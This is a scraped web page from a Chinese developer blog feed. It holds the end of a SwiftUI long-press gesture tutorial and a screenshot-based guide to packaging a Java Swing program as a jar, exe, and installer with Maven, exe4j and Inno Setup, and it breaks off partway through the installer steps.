                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">功能</h3>
<p>为任意 View 添加长按手势识别。当用户持续按压且达到指定时长、同时手指偏移不超过阈值时，视为一次有效长按；可实时获取按压状态以驱动过渡动画。</p>
<h3 data-id="heading-1">参数说明</h3>
<ul>
<li><code>minimumDuration</code>：触发所需最短按压时间（秒）。</li>
<li><code>maximumDistance</code>：手指允许的最大偏移，单位为点；超限即判定为取消。</li>
<li><code>onPressingChanged</code>：按压状态变化回调；<code>true</code> 表示按下，<code>false</code> 表示抬起或滑出。</li>
<li><code>action</code>：满足时长与偏移条件后执行的一次性回调。</li>
</ul>
<h3 data-id="heading-2">代码示例</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LongPressGestureBootcamp</span>: <span class="hljs-title class_">View</span> {
    
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> isComplete: <span class="hljs-type">Bool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> isSuccess: <span class="hljs-type">Bool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Rectangle</span>()
                .fill(isSuccess <span class="hljs-operator">?</span> .green : .blue)
                .frame(maxWidth: isComplete <span class="hljs-operator">?</span> .infinity : <span class="hljs-number">0</span>)
                .frame(height: <span class="hljs-number">56</span>)
                .frame(maxWidth: .infinity, alignment: .leading)
                .background(.gray)
            
            <span class="hljs-type">HStack</span> {
                <span class="hljs-type">Text</span>(<span class="hljs-string">"CLICK HERE"</span>)
                    .foregroundStyle(.white)
                    .padding()
                    .background(.black)
                    .cornerRadius(<span class="hljs-number">8</span>)
                    .onLongPressGesture(
                        minimumDuration: <span class="hljs-number">1.0</span>,
                        maximumDistance: <span class="hljs-number">56</span>) { (isPressing) <span class="hljs-keyword">in</span>
                            <span class="hljs-comment">// start of press -&gt; min duration</span>
                            <span class="hljs-keyword">if</span> isPressing {
                                withAnimation(.easeInOut(duration: <span class="hljs-number">1.0</span>)) {
                                    isComplete <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
                                }
                            }
                            <span class="hljs-keyword">else</span> {
                                <span class="hljs-type">DispatchQueue</span>.main.asyncAfter(deadline: .now() <span class="hljs-operator">+</span> <span class="hljs-number">0.1</span>) {
                                    <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>isSuccess {
                                        withAnimation(.easeInOut) {
                                            isComplete <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
                                        }
                                    }
                                }
                            }
                        } perform: {
                            <span class="hljs-comment">// at the min duration</span>
                            withAnimation(.easeInOut) {
                                isSuccess <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
                            }
                        }
                
                <span class="hljs-type">Text</span>(<span class="hljs-string">"RESET"</span>)
                    .foregroundStyle(.white)
                    .padding()
                    .background(.black)
                    .cornerRadius(<span class="hljs-number">8</span>)
                    .onTapGesture {
                        isComplete <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
                        isSuccess <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
                    }
            }
        }
        
        
<span class="hljs-comment">//        Text(isComplete ? "COMPLETED" : "NOT COMPLETE")</span>
<span class="hljs-comment">//            .padding()</span>
<span class="hljs-comment">//            .background(isComplete ? .green : .gray)</span>
<span class="hljs-comment">//            .cornerRadius(8)</span>
<span class="hljs-comment">////            .onTapGesture {</span>
<span class="hljs-comment">////                withAnimation {</span>
<span class="hljs-comment">////                    isComplete.toggle()</span>
<span class="hljs-comment">////                }</span>
<span class="hljs-comment">////            }</span>
<span class="hljs-comment">//            .onLongPressGesture(minimumDuration: 1.0, maximumDistance: 50, perform: {</span>
<span class="hljs-comment">//                isComplete.toggle()</span>
<span class="hljs-comment">//            })</span>
    }
}
</code></pre>
<h3 data-id="heading-3">注意事项</h3>
<ol>
<li>若同时附加 <code>.onTapGesture</code>，长按结束后可能额外触发一次点按，应通过状态标志互斥。</li>
<li>在 <code>onPressingChanged</code> 中更新界面时，请使用 <code>withAnimation</code> 保证过渡流畅。</li>
<li>耗时操作请置于 <code>action</code> 的异步闭包内，避免阻塞主线程。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[将Java程序打包成exe文件]]></title>    <link>https://juejin.cn/post/7580287891272958015</link>    <guid>https://juejin.cn/post/7580287891272958015</guid>    <pubDate>2025-12-06T09:09:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580287891272958015" data-draft-id="7580297762189787177" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="将Java程序打包成exe文件"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-06T09:09:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="青白菜"/> <meta itemprop="url" content="https://juejin.cn/user/2665664950312007"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            将Java程序打包成exe文件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2665664950312007/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    青白菜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:09:19.000Z" title="Sat Dec 06 2025 09:09:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">java打包jar</h2>
<ol>
<li>创建一个简单的工程</li>
</ol>
<p>使用idea创建简单的java程序工程</p>
<ol start="2">
<li>导入依赖文件pom</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javaexe<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>javaexe<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.apache.org<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-shade-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>shade<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
              <span class="hljs-comment">&lt;!-- 此处按需编写更具体的配置 --&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">transformers</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">transformer</span> <span class="hljs-attr">implementation</span>=<span class="hljs-string">"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>org.example.App<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">transformer</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">transformers</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
<p>3.  代码</p>
<p>主程序入口</p>
<pre><code class="hljs language-arduino" lang="arduino">package org.example;

<span class="hljs-keyword">import</span> javax.swing.*;

<span class="hljs-comment">/**
 * Hello world!
 *
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> 
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">( <span class="hljs-type">String</span>[] args )</span>
    </span>{
        System.out.<span class="hljs-built_in">println</span>( <span class="hljs-string">"Hello World!"</span> );
        JOptionPane.<span class="hljs-built_in">showMessageDialog</span>(null, <span class="hljs-string">"Hello World!"</span>);
        System.<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }
}
</code></pre>
<p>4.  将工程打包成jar包</p>
<h2 data-id="heading-1">打包exe</h2>
<h3 data-id="heading-2">1. 下载exe4j与安装</h3>
<p>地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ej-technologies.com%2Fexe4j%2Fdownload" target="_blank" title="https://www.ej-technologies.com/exe4j/download" ref="nofollow noopener noreferrer">www.ej-technologies.com/exe4j/downl…</a></p>
<p>安装exe4j</p>
<h3 data-id="heading-3">2. java打包exe</h3>
<ol>
<li>第一步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ced26d00724847ffb5310cd4906f1fb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=zha62Ebjxsrh3eYlYlRCSrH9m%2BU%3D" alt="" loading="lazy"/></p>
<p>选择完成后下一步</p>
<ol start="2">
<li>第二步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/943b710318494af0bf8a5c86bb4a9b8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=piJq3J5vDeNvHMYRB9f6%2B%2B4nrvU%3D" alt="" loading="lazy"/></p>
<p>完成后下一步</p>
<ol start="3">
<li>第三步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e601909af58a46239e7218294fd6c70c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=h8kBAMYxOBSIlOvE%2B7nBeU5NpPg%3D" alt="" loading="lazy"/></p>
<p>完成后下一步</p>
<ol start="4">
<li>第四步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/151501c90de3469d8594caa9620bd808~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=uBHtK1o%2B%2FKifZa9XRYw6xk0CVY0%3D" alt="" loading="lazy"/></p>
<p>完成后下一步</p>
<ol start="5">
<li>第五步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8841293a37744f1cbdc6d2c01d69f066~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=X5GQX9E%2Fkx15DP5cnH0xgjNQo58%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3a6b813533a45c5882d56eb5567d907~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=SiCp3HjFSJN4WQrsBeDabEJTxh4%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96cdf8aec7464fd5afe256318a195788~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=DfN0%2Bx%2BDMUN7YyLRfwJnJVUKbEg%3D" alt="" loading="lazy"/></p>
<p>完成后下一步</p>
<ol start="6">
<li>第六步</li>
</ol>
<p>这是配置java的运行环境</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20e762102c704800a310e215bb973e46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=fcEAAkoFEjUhXt7JV3bTaPQzC5U%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9187ea3c2be402cac1e247bdab11852~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=aiEnECICVCSBgFPR1q84U6i%2B%2B8Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">Inno Setup 6打包</h2>
<h3 data-id="heading-5">1. 下载安装</h3>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fjrsoftware.org%2Fisinfo.php" target="_blank" title="https://jrsoftware.org/isinfo.php" ref="nofollow noopener noreferrer">jrsoftware.org/isinfo.php</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a13461eeb84995bb5a1a6604530a2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=Lvs1HRmdSqtEPR69miLLq5ZRpB4%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69467164c3844029b584d1202b35f3ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=88McM87EoHocm3qN%2FYra4BYMrI8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">2. 打包</h3>
<p>说明将jer和java的exe打包一起，这样就只要安装就可以了</p>
<ol>
<li>第一步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ddd5a8277cbb458bb539aa1b956a631a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=muXFcOlY7naSPMJb2kjhvff3Iz0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b404407943ce48619a72b4700e2c6af6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=KxX9MrcvLBvANGLIuUs5IjOshDc%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>第二步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55349d5316f645d1a0aef6e0e114fce2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=yRg45cc%2BBTeqXibJVPg33xR0GfY%3D" alt="" loading="lazy"/></p>
<ol start="3">
<li>第三步</li>
</ol>
